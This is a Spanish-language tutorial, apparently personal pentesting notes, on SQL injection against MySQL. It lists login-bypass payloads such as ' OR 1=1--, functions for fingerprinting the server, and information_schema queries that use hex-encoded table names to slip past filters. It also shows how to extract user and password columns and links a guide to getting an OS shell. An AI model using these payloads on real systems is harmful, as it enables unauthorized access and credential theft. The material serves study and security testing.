# SQL Injection

Esta vulnerabilidad consiste en inyectar código SQL invasor dentro del código SQL programado, con el objetivo de alterar el funcionamiento del programa.

Una **aproximación a la query** suele ser:

```SQL
SELECT * FROM <x> WHERE <y>=___ ;
```

o

```SQL
SELECT * FROM <x> WHERE <y> LIKE '% ___ %';
```

## MySQL database

Una manera de conocer si la DB es **vulnerable**, es poniendo en la query un `'`. Si vemos que la DB devuelve algún error, eso puede ser indicio de que es vulnerable.

Es **importante** jugar con las comillas (`'`), ya que dependiendo del nivel de seguridad, se podrán usar o no. También hay que tener en cuenta los carácteres al final de la sentencia. Algunos que se pueden usar son `--`, `--+` o `#` (para comentar el resto de la query en el backend).

Algunas de las **consultas básicas** que se usan en este tipo de ataque son:

```TXT
1' OR 1=1--'
1' OR '1' = '1
'OR"='
' OR 1=1--'
' OR 0=0 --'
' OR 'x'='x
```

Estas inyecciones son de gran utilidad:

- `version()` o `@@version`: muestra la version del servidor MySQL.
- `database()`: muestra el nombre de la base de datos actual.
- `current_user()`: muestra la el nombre de usuario y el del host para el que esta autentificada la conexión actual. Este valor corresponde a la cuenta que se usa para  evaluar los privilegios de acceso. Puede ser diferente del valor de `USER()`.
- `@@username`: muestra el usuario actual
- `last_insert_id()`: devuelve el último valor generado automáticamente que fue insertado en una columna de tipo `AUTO_INCREMENT`.
- `connection_id()`: muestra la el ID de una conexión. Cada conexión tiene su propio y único identificador.
- `@@datadir`: muestra el directorio de la base de datos.

Primero, es importante saber con cuantas **columnas** trabajamos o podemos trabajar. Para ello podemos jugar con la sentencia `ORDER BY`.

Podemos conocer el **nombre y versión** de la DB añadiendo a la query

```SQL
SELECT database(), version()
```

Para obtener **[todas las tablas](https://dev.mysql.com/doc/refman/8.0/en/tables-table.html)** de la DB, se puede hacer añadiendo la consulta:

```SQL
SELECT table_name FROM information_schema.tables
```

Si queremos ver **todas las columnas de una tabla**, podemos hacerlo con la siguiente query:

```SQL
SELECT column_name FROM information_schema.columns
WHERE table_name=char(117,115,101,114,115)
```

o

```SQL
SELECT column_name FROM  information_schema.columns WHERE table_name=0x7573657273
```

En el ejemplo anterior, se intenta buscar todas las columnas de la tabla _users_, pero en la query no se puede poner tal cual _users_, si no que se ha de [pasar a decimal o hexadecimal](https://cryptii.com/pipes/text-decimal). (_users en decimal es 117 115 101 114 115 y en hexadecimal es 0x7573657273_)

Si deseamos obtener datos de alguna columna concreta (en este caso intentaremos obtener _user_ y _password_), deberemos añadir lo siguiente a la query:

```SQL
SELECT user, password FROM users
```

## Enlaces de interes

[SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

[SQL Injection Attacks by Example](http://www.unixwiz.net/techtips/sql-injection.html)

[Use SQL Injection to Run OS Commands & Get a Shell](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/)
